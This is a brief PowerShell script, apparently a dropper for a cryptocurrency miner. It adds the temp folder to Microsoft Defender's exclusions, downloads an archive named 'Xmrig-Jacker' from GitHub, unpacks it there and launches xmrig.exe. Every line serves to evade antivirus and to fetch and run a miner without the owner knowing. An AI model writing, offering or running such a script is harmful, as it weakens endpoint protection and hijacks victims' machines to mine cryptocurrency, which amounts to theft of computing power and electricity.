Add-MpPreference -ExclusionPath "$env:temp"
$D = "$env:temp"
Invoke-WebRequest -Uri 'https://github.com/Peekaboo-ICU/Xmrig-Jacker/archive/refs/heads/main.zip' -OutFile "$D\Xmrig-Jacker-main.zip"
Expand-Archive -Path "$D\Xmrig-Jacker-main.zip" -DestinationPath $D -Force
& "$D\Xmrig-Jacker-main\xmrig\xmrig.exe"
